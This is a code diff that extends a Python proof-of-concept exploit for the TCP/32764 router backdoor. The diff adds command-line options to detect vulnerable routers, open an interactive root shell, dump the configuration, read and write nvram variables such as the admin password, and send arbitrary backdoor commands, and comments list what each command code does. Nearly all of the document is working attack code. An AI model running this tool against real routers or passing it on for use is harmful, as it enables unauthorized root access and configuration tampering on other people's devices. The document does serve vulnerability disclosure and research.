@@ -1,31 +1,23 @@
 import socket
 import struct
 import sys
+import argparse
 
-HOST = '192.168.1.1'
-PORT = 32764
+parser = argparse.ArgumentParser(description='PoC for the TCP/32764 backdoor.\n'\
+	'see https://github.com/elvanderb/TCP-32764 for more details')
 
-# Big endian or little endian ?
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-s.settimeout(1)
+parser.add_argument('--ip', type=str, nargs='?', help='routers IP', default='192.168.1.1')
+parser.add_argument('--port', type=int, nargs='?', help='port to use', default=32764)
+command_group = parser.add_mutually_exclusive_group()
+command_group.add_argument('--is_vuln', help='tells you if the router is vulnerable or not (default)', action="store_true")
+command_group.add_argument('--shell', help='gives you a root shell on the router', action="store_true")
+command_group.add_argument('--print_conf', help='pretty print router\'s configuration', action="store_true")
+command_group.add_argument('--get_var', type=str, nargs='?', metavar='var_name', help='get router\'s configuration variable')
+command_group.add_argument('--set_var', type=str, nargs='?', metavar='var_name=val', help='set router\'s configuration variable')
+command_group.add_argument('--message', type=int, nargs='?', help='message to send', choices=range(1, 14))
+parser.add_argument('--payload', type=str, nargs='?', help='message\'s payload', default='')
 
-s.send("blablablabla")
-r = s.recv(0xC)
-while len(r) < 0xC:
-	tmp = s.recv(0xC - len(r))
-	assert len(tmp) != 0
-	r += tmp
-s.close()
-
-sig, ret_val, ret_len = struct.unpack('<III', r)
-if sig == 0x53634D4D :
-	endianness = "<"
-elif sig == 0x4D4D6353 :
-	endianness = ">"
-else :
-	print "probably not vulnerable"
-	sys.exit(0)
+args = parser.parse_args()
 
 def send_message(s, endianness, message, payload=''):
 	header = struct.pack(endianness + 'III', 0x53634D4D, message, len(payload))
@@ -51,18 +43,61 @@ def send_message(s, endianness, message, payload=''):
 
 	return ret_val, ret_str
 
+# Big endian or little endian ?
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
 s.settimeout(1)
+try :
+	s.connect((args.ip, args.port))
+except socket.error, v:
+	print "probably not vulnerable (error: %s)"%v
+	sys.exit(0)
 
-# uncomment to turned on wireless access to the administration web console
-# send_message(s, endianness, 3, "wlan_mgr_enable=1")
-# uncomment to get the administration web console's password
-# print send_message(s, endianness, 2, "http_password")[1]
+s.send("blablablabla")
+r = s.recv(0xC)
+while len(r) < 0xC:
+	tmp = s.recv(0xC - len(r))
+	assert len(tmp) != 0
+	r += tmp
 
-print send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1]
-while 1 :
-	print send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1]
+sig, ret_val, ret_len = struct.unpack('<III', r)
+if sig == 0x53634D4D :
+	endianness = "<"
+elif sig == 0x4D4D6353 :
+	endianness = ">"
+else :
+	print "probably not vulnerable"
+	sys.exit(0)
+s.close()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(1)
+s.connect((args.ip, args.port))
+if args.is_vuln :
+	print "%s:%d is vulnerable!"%(args.ip, args.port)
+elif args.shell :
+	print send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1]
+	while 1 :
+		print send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1]
+elif args.print_conf :
+	conf = send_message(s, endianness, 1)[1]
+	conf = conf.replace("\x00", "\n")
+	conf = conf.replace("\x01", "\n\t")
+	print conf
+elif args.get_var is not None :
+	print send_message(s, endianness, 2, args.get_var)[1]
+elif args.set_var is not None :
+	r, _ = send_message(s, endianness, 3, args.set_var)[1]
+elif args.message is not None :
+	r, response = send_message(s, endianness, args.message, args.payload)[1]
+	if r != 0 :
+		print "Command failed, error code: %08X"%r
+	elif len(response) != 0 :
+		print "Command succeed:"
+		print response
+	else :
+		print "Command succeed:"
+else :
+	print "%s:%d is vulnerable!"%(args.ip, args.port)
 
 s.close()
 
@@ -96,4 +131,3 @@ s.close()
 #11 : resaure default settings (nvram_set(restore_default, 1) / nvram_commit)
 #12 : read /dev/mtdblock/0 [-4:-2]
 #13 : dump nvram on disk (/tmp/nvram) and commit
-
